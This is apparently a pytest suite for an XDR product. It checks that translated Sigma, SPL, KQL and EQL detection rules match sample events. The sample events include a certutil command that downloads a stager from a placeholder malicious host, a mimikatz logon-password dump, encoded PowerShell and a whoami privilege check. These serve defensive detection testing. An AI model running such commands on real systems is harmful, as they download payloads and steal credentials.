"""
NivXRay XDR — Phase 2.1 Semantic Equivalence Validation Suite.
Proves source-intent fixtures match translated Canonical IR evaluations:
  source expected positive == NivXRay translated positive
  source expected negative == NivXRay translated negative
Enforces that where semantic equivalence cannot be proven, promotion to ACTIVE is blocked.
"""
import pytest
from detection_content.canonical_ir import TranslationFidelity
from detection_content.translation import TranslationManager


@pytest.fixture
def manager():
    return TranslationManager()


def test_sigma_semantic_equivalence_execution(manager):
    """Verify Sigma translated IR matches positive and negative events."""
    rule_yaml = """
title: Encoded PowerShell Execution
id: EQ-SIGMA-001
logsource: {category: process_creation, product: windows}
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - '-enc'
            - '-encodedcommand'
    filter_trusted:
        User: 'NT AUTHORITY\\SYSTEM'
    condition: selection and not filter_trusted
"""
    res = manager.translate("sigma", rule_yaml)
    assert res.success is True
    ir = res.ir

    # Positive event 1: powershell with -enc as normal user
    pos1 = {
        "process": {"name": "powershell.exe", "command_line": "powershell.exe -enc SQBFAFgA..."},
        "identity": {"principal_id": "CORP\\john_doe"},
    }
    assert ir.evaluate(pos1) is True, "Expected positive match for standard encoded PowerShell"

    # Positive event 2: powershell with -encodedcommand
    pos2 = {
        "process": {"name": "powershell.exe", "command_line": "powershell.exe -encodedcommand d2hvYW1p"},
        "identity": {"principal_id": "CORP\\alice"},
    }
    assert ir.evaluate(pos2) is True, "Expected positive match for -encodedcommand"

    # Negative event 1: powershell without encoded command
    neg1 = {
        "process": {"name": "powershell.exe", "command_line": "powershell.exe Get-Process"},
        "identity": {"principal_id": "CORP\\john_doe"},
    }
    assert ir.evaluate(neg1) is False, "Expected negative result for unencoded powershell"

    # Negative event 2: powershell with -enc but by SYSTEM (filter matches)
    neg2 = {
        "process": {"name": "powershell.exe", "command_line": "powershell.exe -enc SQBFAFgA..."},
        "identity": {"principal_id": "NT AUTHORITY\\SYSTEM"},
    }
    assert ir.evaluate(neg2) is False, "Expected negative result for filtered SYSTEM execution"

    # Negative event 3: non-powershell process with -enc in args
    neg3 = {
        "process": {"name": "cmd.exe", "command_line": "cmd.exe /c echo -enc"},
        "identity": {"principal_id": "CORP\\john_doe"},
    }
    assert ir.evaluate(neg3) is False, "Expected negative result for cmd.exe"


def test_spl_semantic_equivalence_execution(manager):
    """Verify SPL translated IR matches positive and negative events."""
    query = 'process="certutil.exe" CommandLine="*urlcache*" CommandLine="*-f*"'
    res = manager.translate("spl", query)
    assert res.success is True
    ir = res.ir

    pos = {
        "process": {
            "name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://malicious.site/stager.exe payload.exe",
        }
    }
    assert ir.evaluate(pos) is True

    # Missing -f flag
    neg1 = {
        "process": {
            "name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split http://example.com/stager.exe payload.exe",
        }
    }
    assert ir.evaluate(neg1) is False

    # Different process name
    neg2 = {
        "process": {
            "name": "curl.exe",
            "command_line": "curl.exe -urlcache -f http://example.com",
        }
    }
    assert ir.evaluate(neg2) is False


def test_kql_semantic_equivalence_execution(manager):
    """Verify KQL translated IR matches positive and negative events."""
    query = 'DeviceProcessEvents | where FileName in~ ("cmd.exe", "powershell.exe") and ProcessCommandLine has "mimikatz"'
    res = manager.translate("kql", query)
    assert res.success is True
    ir = res.ir

    pos = {
        "process": {
            "name": "cmd.exe",
            "command_line": "cmd.exe /c mimikatz.exe sekurlsa::logonpasswords",
        }
    }
    assert ir.evaluate(pos) is True

    neg = {
        "process": {
            "name": "cmd.exe",
            "command_line": "cmd.exe /c dir C:\\Windows",
        }
    }
    assert ir.evaluate(neg) is False


def test_eql_semantic_equivalence_execution(manager):
    """Verify EQL translated IR matches positive and negative events."""
    query = 'process where process.name == "whoami.exe" and process.command_line == "* /priv"'
    res = manager.translate("eql", query)
    assert res.success is True
    ir = res.ir

    pos = {
        "process": {
            "name": "whoami.exe",
            "command_line": "C:\\Windows\\system32\\whoami.exe /priv",
        }
    }
    assert ir.evaluate(pos) is True

    neg = {
        "process": {
            "name": "whoami.exe",
            "command_line": "C:\\Windows\\system32\\whoami.exe /all",
        }
    }
    assert ir.evaluate(neg) is False


def test_unsupported_fidelity_prevents_promotion(manager):
    """Where semantic equivalence cannot be proven due to fatal constructs, promotion is prevented."""
    # Splunk query with eval and rex
    spl_query = 'index=win process="rundll32.exe" | rex field=CommandLine "(?<target>.*)" | eval x=1'
    res = manager.translate("spl", spl_query)
    assert res.fidelity == TranslationFidelity.UNSUPPORTED
    assert res.ir.is_promotable() is False

    # Evaluation returns False safe-closed
    ev = {"process": {"name": "rundll32.exe", "command_line": "rundll32.exe test.dll"}}
    assert res.ir.evaluate(ev) is False
